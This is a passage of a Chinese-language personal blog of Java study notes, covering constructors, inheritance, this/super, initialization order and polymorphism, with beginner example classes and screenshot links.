src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301223516746.png" alt="image-20220301223516746"></p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>定义到方法中的变量是局部变量，局部变量只在方法中有效</p><p>局部变量在使用前必须完成初始化，否则报错</p><p>定义到类中的变量是成员变量，成员变量只在类中有效</p><p>局部变量在方法调用后，才会进行初始化，当方法执行完毕就会随方法弹栈消失</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225248322.png" alt="image-20220301225248322"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225548707.png" alt="image-20220301225548707"></p><h2 id="可变形参"><a href="#可变形参" class="headerlink" title="可变形参"></a>可变形参</h2><p>参数的个数可以是任意个 0~n</p><p>如何声明？</p><pre><code class="java">public static void sum(int...a)&#123;&#125;  //三个点</code></pre><p>可变形参采用数组存储实参</p><pre><code class="java">xxxxxxxxxx public static void sum(double a , int...a)&#123;&#125; </code></pre><p>不能存在两个可变参数，且可变参数必须在最后</p><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>不同的方法可以使用相同的方法名</p><p>要求：同一类中，同一方法名，不同的形参列表：数量、顺序、类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302000931131.png" alt="image-20220302000931131"></p><p>方法调用时会根据不同的数据类型找到最佳匹配的方法</p><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>idea</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003110469.png" alt="image-20220302003110469"></p><p>命令行</p><pre><code class="java">class Sakura&#123;    public static void main(String [] args)&#123;        for(String ele:args)&#123;            System.out.println(ele);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003703283.png" alt="image-20220302003703283"></p><h2 id="静态导入"><a href="#静态导入" class="headerlink" title="静态导入"></a>静态导入</h2><p>导入一个类中的所有静态资源</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302004244597.png" alt="image-20220302004244597"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003831636.png" alt="image-20220302003831636"></p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302225312848.png" alt="image-20220302225312848"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302235022144.png" alt="image-20220302235022144"></p><h2 id="对象类型数组"><a href="#对象类型数组" class="headerlink" title="对象类型数组"></a>对象类型数组</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303001402384.png" alt="image-20220303001402384"></p><h2 id="封装的概念及四个权限修饰符的概念"><a href="#封装的概念及四个权限修饰符的概念" class="headerlink" title="封装的概念及四个权限修饰符的概念"></a>封装的概念及四个权限修饰符的概念</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215651821.png" alt="image-20220303215651821"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215810126.png" alt="image-20220303215810126"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220134500.png" alt="image-20220303220134500"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220910747.png" alt="image-20220303220910747"></p><h2 id="属性的简单封装"><a href="#属性的简单封装" class="headerlink" title="属性的简单封装"></a>属性的简单封装</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221632106.png" alt="image-20220303221632106"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221931211.png" alt="image-20220303221931211"></p><h1 id="day9面向对象"><a href="#day9面向对象" class="headerlink" title="day9面向对象"></a>day9面向对象</h1><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>可以快速给成员变量赋值</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231205347.png" alt="image-20220303231205347"></p><p>创建类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231339865.png" alt="image-20220303231339865"></p><p>构造</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231528049.png" alt="image-20220303231528049"></p><p>每一个类都会有一个无参构造器，但是当声明有参构造器后，默认无参构造器就会消失，这时候如果再写</p><pre><code class="java">Student s = new Student();</code></pre><p>就会报错。所以建议自定义类都再提供一个无参构造器。</p><p>使用构造器创建对象</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303232035228.png" alt="image-20220303232035228"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303233229581.png" alt="image-20220303233229581"></p><h2 id="对属性的封装"><a href="#对属性的封装" class="headerlink" title="对属性的封装"></a>对属性的封装</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304004650481.png" alt="image-20220304004650481"></p><p>要对用户的信息进行校验</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005044933.png" alt="image-20220304005044933"></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005720701.png" alt="image-20220304005720701"></p><pre><code class="java">//Staff.javapackage com.sakura.staff;public class Staff &#123;    private int num;    private char sex;    private double salary;    private String name;    public Staff(int a, String b, char c, double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    public Staff()&#123;&#125;    void setinfo(int a,String b,char c,double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    void getinfo()&#123;        System.out.println(&quot;num = &quot; + num);        System.out.println(&quot;name = &quot; + name);        System.out.println(&quot;sex = &quot; + sex);        System.out.println(&quot;salary = &quot; + salary);    &#125;&#125;</code></pre><pre><code class="java">//Test.javapackage com.sakura.staff;public class Test &#123;    public static void main(String[] args) &#123;        Staff num1 = new Staff();        num1.setinfo(123,&quot;sakura&quot;,&#39;男&#39;,20000);        num1.getinfo();        Staff num2 = new Staff(666,&quot;Alice&quot;,&#39;女&#39;,10000);        num2.getinfo();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304012001796.png" alt="image-20220304012001796"></p><h2 id="标准javabean"><a href="#标准javabean" class="headerlink" title="标准javabean"></a>标准javabean</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093001246.png" alt="image-20220304093001246"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093017092.png" alt="image-20220304093017092"></p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304093913672.png" alt="image-20220304093913672"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304094152414.png" alt="image-20220304094152414"></p><p>1、使用继承要借用关键字extends</p><p>2、语法结构</p><pre><code class="java">[权限修饰符] 子类 extends 父类&#123;&#125;</code></pre><p>3、当子类继承父类后就可以使用父类的资源</p><p>范例:</p><p>父类:</p><pre><code class="java">package com.sakura.jicheng;public class Animal &#123;    private String name;    private int age;    void setname(String name)&#123;        this.name = name;    &#125;    void setAge(int age)&#123;        this.age = age;    &#125;    void eat()&#123;        System.out.println(this.name+&quot;正在吃饭&quot;);    &#125;    int getinfo_age()&#123;        return this.age;    &#125;    String getinfo_name()&#123;        return this.name;    &#125;&#125;</code></pre><p>Cat类</p><pre><code class="java">package com.sakura.jicheng;public class Cat extends Animal&#123;    void miao()&#123;        System.out.println(&quot;miao~miao~miao~&quot;);    &#125;&#125;</code></pre><p>Dog类</p><pre><code class="java">package com.sakura.jicheng;public class Dog extends Animal&#123;    void wang()&#123;        System.out.println(&quot;wang wang wang&quot;);    &#125;&#125;</code></pre><p>Test类</p><pre><code class="java">package com.sakura.jicheng;public class Test &#123;    public static void main(String[] args) &#123;        Cat cat = new Cat();        cat.setAge(8);        cat.setname(&quot;咪咪&quot;);        System.out.println(cat.getinfo_age());        System.out.println(cat.getinfo_name());        cat.miao();        Dog dog = new Dog();        dog.setAge(10);        dog.setname(&quot;大白&quot;);        System.out.println(dog.getinfo_age());        System.out.println(dog.getinfo_name());        dog.wang();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304130800705.png" alt="image-20220304130800705"></p><h2 id="当出现同名变量时：this与super"><a href="#当出现同名变量时：this与super" class="headerlink" title="当出现同名变量时：this与super"></a>当出现同名变量时：this与super</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304131840347.png" alt="image-20220304131840347"></p><p>super代表从父类继承下来的资源</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304132237877.png" alt="image-20220304132237877"></p><h2 id="继承资源的查找"><a href="#继承资源的查找" class="headerlink" title="继承资源的查找"></a>继承资源的查找</h2><p>父类的方法不能满足子类需求时，要进行方法重写</p><p>子类在使用资源时，优先在本类中查找，当本类中没有时，才去父类中查找，一点一点向上找，直到找到object类</p><p>object类是所有类的父类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304145340962.png" alt="image-20220304145340962"></p><h2 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h2><p>1、当子类重写父类的方法时，访问权限不能比父类的访问权限更加严格，要&gt;=父类的访问权限</p><p>2、返回值类型</p><p>当父类的返回类型是基本数据类型时，则子类必须与父类保持一致</p><p>当父类的返回类型是引用数据类型时，则子类可以是返回父类，也可以是返回子类</p><p>3、方法重写时，子类的形参必须与父类的形参保持一致，否则就相当于在子类中新增一个方法</p><p>4、子类不能抛出比父类更大的异常</p><h2 id="this详解"><a href="#this详解" class="headerlink" title="this详解"></a>this详解</h2><p>this可以区分局部变量和成员变量</p><p>this可以调用本类中的构造器(是根据数据类型来匹配的，而不是形参名)</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304152113902.png" alt="image-20220304152113902"></p><p>调用另一个构造器时，this必须放在本构造器首行，如本例中</p><pre><code class="java">this(name,age,salary);</code></pre><p>就在首行</p><p>一般都是多参调少参。在本类中，this可省略</p><h2 id="super详谈"><a href="#super详谈" class="headerlink" title="super详谈"></a>super详谈</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304153656976.png" alt="image-20220304153656976"></p><p>每一个构造器首行都会有一个默认的隐藏的super，调用父类无参的构造器</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304154053753.png" alt="image-20220304154053753"></p><p>当这种情况的时候，super是在少参的构造器中,第二个参数构造器的super()自动消失了</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304155540813.png" alt="image-20220304155540813"></p><p>可以使用super()调用父类有参的构造器</p><p>可以使用super.调用父类的属性和方法</p><h2 id="成员变量的赋值方法"><a href="#成员变量的赋值方法" class="headerlink" title="成员变量的赋值方法"></a>成员变量的赋值方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160521490.png" alt="image-20220304160521490"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160500362.png" alt="image-20220304160500362"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160942707.png" alt="image-20220304160942707"></p><p>代码块用 {}包裹</p><p>当是这种静态代码块时，代码块只执行一次</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160839692.png" alt="image-20220304160839692"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160744120.png" alt="image-20220304160744120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304160752027.png" alt="image-20220304160752027"></p><p>静态代码块:用于给静态变量进行赋值</p><p>静态代码只会执行一次，再次创建n个对象也不会执行。也是先于构造器执行</p><p>给成员变量赋值方式:</p><p>1.<strong>默认值</strong></p><p>2.<strong>直接赋值</strong></p><p>3.<strong>代码块赋值</strong></p><p>4.<strong>get/set赋值</strong></p><p>5、<strong>构造器赋值</strong></p><p>静态变量不建议采用使用构造器赋值，因为它是属于类的，可以直接 类名.属性进行赋值</p><h1 id="day10-面向对象"><a href="#day10-面向对象" class="headerlink" title="day10 面向对象"></a>day10 面向对象</h1><h2 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306000154596.png" alt="image-20220306000154596"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306001804012.png" alt="image-20220306001804012"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306002346773.png" alt="image-20220306002346773"></p><p>当有子类的初始化时，会先对父类进行初始化，再初始化子类</p><h2 id="类的初始化不含子类"><a href="#类的初始化不含子类" class="headerlink" title="类的初始化不含子类"></a>类的初始化不含子类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306010601437.png" alt="image-20220306010601437"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306010614896.png" alt="image-20220306010614896"></p><h2 id="实例初始化不含子类"><a href="#实例初始化不含子类" class="headerlink" title="实例初始化不含子类"></a>实例初始化不含子类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306011526112.png" alt="image-20220306011526112"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306011757666.png" alt="image-20220306011757666"></p><p>每次调用构造器，都会重复执行一次init方法</p><h2 id="类的初始化含子类"><a href="#类的初始化含子类" class="headerlink" title="类的初始化含子类"></a>类的初始化含子类</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306012632684.png" alt="image-20220306012632684"></p><h2 id="混合初始化"><a href="#混合初始化" class="headerlink" title="混合初始化"></a>混合初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306013247338.png" alt="image-20220306013247338"></p><h2 id="多态的初识"><a href="#多态的初识" class="headerlink" title="多态的初识"></a>多态的初识</h2><p>封装：隐藏内部的实习细节，只对外暴露少量接口，供外界访问</p><p>方法：对功能的封装</p><p>类：对方法的封装</p><p>包：对模块的封装</p><hr><p>继承：实现资源的复用</p><p>​              方法属性</p><hr><p>多态：一个对象的多种形态</p><p>作用：可以让代码更加灵活</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110018629.png" alt="image-20220306110018629"></p><p>多态有两种状态(左边编译时状态 = 右边运行时状态)：</p><p>1、编译时状态</p><p>2、运行时状态</p><p>多态创建的对象能够调用什么方法要看编译时状态</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110650725.png" alt="image-20220306110650725"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306110802347.png" alt="image-20220306110802347"></p><p>示例代码:</p><p>Animal类</p><pre><code class="java">package com.sakura.duotai;public class Animal &#123;    void eat()&#123;        System.out.println(&quot;吃饭啦~~&quot;);    &#125;&#125;</code></pre><p>Cat类</p><pre><code class="java">package com.sakura.duotai;public class Cat extends Animal&#123;    void eat()&#123;        System.out.println(&quot;猫吃鱼&quot;);    &#125;    void catchMouse()&#123;        System.out.println(&quot;猫抓老鼠&quot;);    &#125;&#125;</code></pre><p>Dog类</p><pre><code class="java">package com.sakura.duotai;public class Dog &#123;    void eat()&#123;        System.out.println(&quot;狗吃骨头&quot;);    &#125;    void lookHome()&#123;        System.out.println(&quot;狗看家&quot;);    &#125;&#125;</code></pre><p>当我们用Animal类去new一个子类对象时，就是多态的一种体现</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113022606.png" alt="image-20220306113022606"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113038273.png" alt="image-20220306113038273"></p><p>如图，输出的是猫重写的eat方法</p><p>但当我们尝试调用cat中其它方法时，就会报错</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306113233339.png" alt="image-20220306113233339"></p><pre><code class="java">Animal a = new Cat();/**这里的Animal a 就是编译时状态 new cat(); 是运行时状态多态创建的对象能够调用什么方法要看编译时状态,代码跑起来时对象是谁，要看运行时状态**/</code></pre><h2 id="多态的作用一节省代码量"><a href="#多态的作用一节省代码量" class="headerlink" title="多态的作用一节省代码量"></a>多态的作用一节省代码量</h2><pre><code class="java">package com.sakura.duotai1;public class Programmer &#123;    void eat()&#123;        System.out.println(&quot;程序员 干饭&quot;);    &#125;&#125;class Chinese extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;中国人使用筷子吃饭&quot;);    &#125;    void act()&#123;        System.out.println(&quot;中国人会功夫&quot;);    &#125;&#125;class India extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;印度人使用手吃饭&quot;);    &#125;    void act()&#123;        System.out.println(&quot;印度人摩托车玩的贼6&quot;);    &#125;&#125;class European extends Programmer&#123;    void eat()&#123;        System.out.println(&quot;欧洲人使用刀叉吃饭&quot;);    &#125;    void act()&#123;        System.out.println(&quot;欧洲人喜欢极限运动&quot;);    &#125;&#125;</code></pre><pre><code class="java">package com.sakura.duotai1;public class Test &#123;    public static void main(String[] args) &#123;        Chinese chinese = new Chinese();        India india = new India();        European european = new European();        showEat(chinese);        showEat(india);        showEat(european);    &#125;    public static void showEat(Programmer programmer)&#123;        programmer.eat();    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306120428090.png" alt="image-20220306120428090"></p><p>这样写,节省了很多代码量</p><p>由于这里的Programmer programmer 是形参，所以会有</p><p>Programmer programmer = chinese/india/european;</p><p>满足父类的引用指向子类的对象</p><h2 id="多态作用二存储不同类型数据"><a href="#多态作用二存储不同类型数据" class="headerlink" title="多态作用二存储不同类型数据"></a>多态作用二存储不同类型数据</h2><pre><code class="java">package com.sakura.duotai2;public class Animal &#123;    void eat()&#123;        System.out.println(&quot;动物吃饭&quot;);    &#125;&#125;class Dog extends Animal&#123;    void eat()&#123;        System.out.println(&quot;猫吃鱼&quot;);    &#125;&#125;class Cat extends Animal&#123;    void eat()&#123;        System.out.println(&quot;狗吃肉&quot;);    &#125;&#125;</code></pre><pre><code class="java">package com.sakura.duotai2;public class Test &#123;    public static void main(String[] args) &#123;        int [] arr = &#123;10,20,30&#125;;//这是一个数组它只能存储同一种类型数据        Animal [] aniarr = new Animal[2];        Dog dog = new Dog();        Cat cat = new Cat();        aniarr[0] = dog;        aniarr[1] = cat;        for(Animal a:aniarr)&#123;            a.eat();        &#125;    &#125;&#125;</code></pre><p>此处的cat和dog是不同类型的示例对象，但是都放在了同一个数组</p><h2 id="多态应用三方法的返回值"><a href="#多态应用三方法的返回值" class="headerlink" title="多态应用三方法的返回值"></a>多态应用三方法的返回值</h2><p>示例代码:</p><p>Programmer.java</p><pre><code class="java">package com.sakura.duotai3;public class Programmer &#123;    void work()&#123;        System.out.println(&quot;程序员 写代码&quot;);    &#125;&#125;class Chinese extends Programmer&#123;    void work()&#123;        System.out.println(&quot;中国 程序员写代码&quot;);    &#125;&#125;class India extends Programmer&#123;    void work()&#123;        System.out.println(&quot;印度 程序员写代码&quot;);    &#125;&#125;class European extends Programmer&#123;    void work()&#123;        System.out.println(&quot;欧洲 程序员写代码&quot;);    &#125;&#125;</code></pre><p>Guigu.java</p><pre><code class="java">package com.sakura.duotai3;public class Guigu &#123;    public static Programmer produce_Grammer(String country)&#123;        if(&quot;中国&quot;.equals(country))&#123;            return new Chinese();        &#125;else if(&quot;印度&quot;.equals(country))&#123;            return new India();        &#125;else if(&quot;欧洲&quot;.equals(country))&#123;            return new European();        &#125;        return null;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai3;import java.util.Scanner;public class Test &#123;    public static void main(String[] args) &#123;        System.out.println(&quot;请输入您需要的程序员国家:&quot;);        Scanner input = new Scanner(System.in);        String country = input.next();        Programmer programmer = Guigu.produce_Grammer(country);        if (programmer != null) &#123;            programmer.work();        &#125; else &#123;            System.out.println(&quot;还没有此国家程序员&quot;);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306153850750.png" alt="image-20220306153850750"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306153923126.png" alt="image-20220306153923126"></p><h2 id="多态的练习一"><a href="#多态的练习一" class="headerlink" title="多态的练习一"></a>多态的练习一</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306154354906.png" alt="image-20220306154354906"></p><p>Traffic.java</p><pre><code class="java">package com.sakura.duotai4;public class Traffic &#123;    public void drive()&#123;        System.out.println(&quot;交通工具通行&quot;);    &#125;&#125;class Car extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;汽车奔驰在马路上&quot;);    &#125;&#125;class Bike extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;自行车在马路上缓慢的走着&quot;);    &#125;&#125;class Truck extends Traffic&#123;    public void drive()&#123;        System.out.println(&quot;货车满载着货物不快不慢的开着&quot;);    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai4;public class Test &#123;    public static void main(String[] args) &#123;        Traffic [] trarr =new Traffic[3];        trarr[0] = new Car();        trarr[1] = new Bike();        trarr[2] = new Truck();        for(Traffic a:trarr)&#123;            a.drive();        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306155645389.png" alt="image-20220306155645389"></p><h2 id="多态的练习二"><a href="#多态的练习二" class="headerlink" title="多态的练习二"></a>多态的练习二</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306155901154.png" alt="image-20220306155901154"></p><p>示例代码:</p><p>Employee.java</p><pre><code class="java">package com.sakura.duotai5;public class Employee &#123;    private String name;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public double earning()&#123;        return 0;    &#125;    public String getinfo()&#123;        return &quot;姓名是:&quot;+name+&quot; ,实发工资&quot;+earning();    &#125;    public Employee()&#123;&#125;;    public Employee(String name) &#123;        this.name = name;    &#125;&#125;</code></pre><p>SalaryEmployee.java</p><pre><code class="java">package com.sakura.duotai5;public class SalaryEmployee extends Employee&#123;    private double salary;    private int workday;    private int offday;    public double getSalary() &#123;        return salary;    &#125;    public void setSalary(double salary) &#123;        this.salary = salary;    &#125;    public int getWorkday() &#123;        return workday;    &#125;    public void setWorkday(int workday) &#123;        this.workday = workday;    &#125;    public int getOffday() &#123;        return offday;    &#125;    public void setOffday(int offday) &#123;        this.offday = offday;    &#125;    public SalaryEmployee()&#123;&#125;;    public SalaryEmployee(double salary, int workday, int offday,String name) &#123;        super(name);        this.salary = salary;        this.workday = workday;        this.offday = offday;    &#125;    @Override    public double earning() &#123;        return (getSalary()-getSalary()/getWorkday()*getOffday());    &#125;&#125;</code></pre><p>Manager.java</p><pre><code class="java">package com.sakura.duotai5;public class Manager extends SalaryEmployee&#123;    private double part;    public double earning()&#123;        return (getSalary()-getSalary()/getWorkday()*getOffday()*(1+part));    &#125;    public Manager()&#123;&#125;    public Manager(double salary, int workday, int offday, String name, double part) &#123;        super(salary, workday, offday, name);        this.part = part;    &#125;&#125;</code></pre><p>HourEmployee.java</p><pre><code class="java">package com.sakura.duotai5;public class HourEmployee extends Employee&#123;    private int hours;    private int hourmoney;    public int getHours() &#123;        return hours;    &#125;    public void setHours(int hours) &#123;        this.hours = hours;    &#125;    public int getHourmoney() &#123;        return hourmoney;    &#125;    public void setHourmoney(int hourmoney) &#123;        this.hourmoney = hourmoney;    &#125;    public double earning()&#123;        return getHours()*getHourmoney();    &#125;    public HourEmployee()&#123;&#125;    public HourEmployee(String name, int hours, int hourmoney) &#123;        super(name);        this.hours = hours;        this.hourmoney = hourmoney;    &#125;&#125;</code></pre><p>Test.java</p><pre><code class="java">package com.sakura.duotai5;public class Test &#123;    public static void main(String[] args) &#123;        Employee [] employee = new Employee[5];        SalaryEmployee s1 = new SalaryEmployee(10000,20,5,&quot;蜡笔小新&quot;);        SalaryEmployee s2 = new SalaryEmployee(15000,20,5,&quot;张伟&quot;);        HourEmployee h1 = new HourEmployee(&quot;苦逼打工人&quot;,30,15);        HourEmployee h2 = new HourEmployee(&quot;小王&quot;,50,30);        Manager m1 = new Manager(20000,22,3,&quot;霸道总裁&quot;,0.9);        employee[0] = s1;        employee[1] = s2;        employee[2] = h1;        employee[3] = h2;        employee[4] = m1;        for(Employee a:employee)&#123;            System.out.println(a.getinfo());        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306213734875.png" alt="image-20220306213734875"></p><h2 id="向下转型"><a href="#向下转型" class="headerlink" title="向下转型"></a>向下转型</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306214039535.png" alt="image-20220306214039535"></p><p>多态的向上转型和向下转型都是都是针对于编译时类型 运行时类型从始至终不会发生改变</p><p>父类的引用指向子类的示例 就是向上转型(弊端:无法使用子类独有资源)：</p><pre><code class="java">Animal ani = new Cat();</code></pre><p>向下转型：</p><p>使用子类自己独有的资源时 down casting</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306215605369.png" alt="image-20220306215605369"></p><p>类似于强制类型转换</p><p>向下转型前提：已经完成了向上转型</p><h2 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h2><p>判断左边的对象是否属于右边类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306220002482.png" alt="image-20220306220002482"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306220011415.png" alt="image-20220306220011415"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306221125721.png" alt="image-20220306221125721"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220306222229248.png" alt="image-20220306222229248"></p><h1 id="day11"><a href="#day11" class="headerlink" title="day11"></a>day11</h1><h2 id="非虚方法"><a href="#非虚方法" class="headerlink" title="非虚方法"></a>非虚方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307222921425.png" alt="image-20220307222921425"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307222347375.png" alt="image-20220307222347375"></p><h2 id="native关键字"><a href="#native关键字" class="headerlink" title="native关键字"></a>native关键字</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307224544250.png" alt="image-20220307224544250"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307224944403.png" alt="image-20220307224944403"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220307225003737.png" 